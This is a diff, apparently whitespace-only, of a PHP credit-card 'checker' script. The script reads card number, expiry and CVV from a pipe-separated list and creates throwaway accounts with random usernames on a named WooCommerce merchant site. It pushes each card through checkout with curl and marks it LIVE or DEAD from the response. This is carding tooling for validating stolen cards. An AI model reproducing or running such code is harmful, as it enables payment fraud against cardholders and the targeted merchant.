@@ -1,53 +1,53 @@
 <?php
-error_reporting(0);
-$time_start = microtime(true);
+    error_reporting(0);
+    $time_start = microtime(true);
 
-if($_SERVER['REQUEST_METHOD'] == 'POST'){
-    extract($_POST);
-}
-else {
-    extract($_GET);
-}
-
-function GetStr($string, $start, $end){
-    $str = explode($start, $string);
-    $str = explode($end, $str[1]);
-    return $str[0];
-}
-
-function RandomString($length = 7)
-{
-    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    $charactersLength = strlen($characters);
-    $randomString     = '';
-    for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    if($_SERVER['REQUEST_METHOD'] == 'POST'){
+        extract($_POST);
     }
-    return $randomString;
-}
+    else {
+        extract($_GET);
+    }
 
-$separator = explode("|", $lista);
-$cc = $separator[0];
-$mm = $separator[1];
-$yy = $separator[2];
-$cvv = $separator[3];
-$postcode = mt_rand(10080, 94545);
-$str = RandomString();
-$username = RandomString().mt_rand(1, 999);
+    function GetStr($string, $start, $end){
+        $str = explode($start, $string);
+        $str = explode($end, $str[1]);
+        return $str[0];
+    }
 
-$cbin = substr($cc, 0,1);
-if($cbin == 5){
-    $cbin = 'master-card';
-}
-else if($cbin == 4){
-    $cbin = 'visa';
-}
-else if($cbin == 3){
-    $cbin = 'amex';
-}
-else {
-    $cbin = 'null';
-}
+    function RandomString($length = 7)
+    {
+        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        $charactersLength = strlen($characters);
+        $randomString     = '';
+        for ($i = 0; $i < $length; $i++) {
+            $randomString .= $characters[rand(0, $charactersLength - 1)];
+        }
+        return $randomString;
+    }
+
+    $separator = explode("|", $lista);
+    $cc = $separator[0];
+    $mm = $separator[1];
+    $yy = $separator[2];
+    $cvv = $separator[3];
+    $postcode = mt_rand(10080, 94545);
+    $str = RandomString();
+    $username = RandomString().mt_rand(1, 999);
+
+    $cbin = substr($cc, 0,1);
+    if($cbin == 5){
+        $cbin = 'master-card';
+    }
+    else if($cbin == 4){
+        $cbin = 'visa';
+    }
+    else if($cbin == 3){
+        $cbin = 'amex';
+    }
+    else {
+        $cbin = 'null';
+    }
 
     $ch = curl_init();
     curl_setopt_array($ch, array(
@@ -159,17 +159,17 @@ else {
     $respo = GetStr($execute, '<ul class="woocommerce-error" role="alert">', '</div>');
     fwrite(fopen("headwatersmusicandarts.org_accounts.txt", "a"), $username."@gmail.com:".$username."\r\n");
 
-if(strpos($execute, 'Thank you')){
+    if(strpos($execute, 'Thank you')){
 
-    echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Authorized</span></td></tr><br>';
-}
-elseif(strpos($execute, 'card verification number does not match')){
+        echo '<tr><td><span class="badge badge-outline-success badge-pill">LIVE</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-success badge-pill">Authorized</span></td></tr><br>';
+    }
+    elseif(strpos($execute, 'card verification number does not match')){
 
-    echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">'.$respo.'</span></td> <td><span class="badge badge-outline-danger badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
-}
-else {
+        echo '<tr><td><span class="badge badge-outline-danger badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-danger badge-pill">'.$respo.'</span></td> <td><span class="badge badge-outline-danger badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
+    }
+    else {
 
-    echo '<tr><td><span class="badge badge-outline-warning badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-warning badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
-}
-unlink("$username.txt");
+        echo '<tr><td><span class="badge badge-outline-warning badge-pill">DEAD</span></td> <td>'.$lista.'</td> <td><span class="badge badge-outline-warning badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
+    }
+    unlink("$username.txt");
 ?>
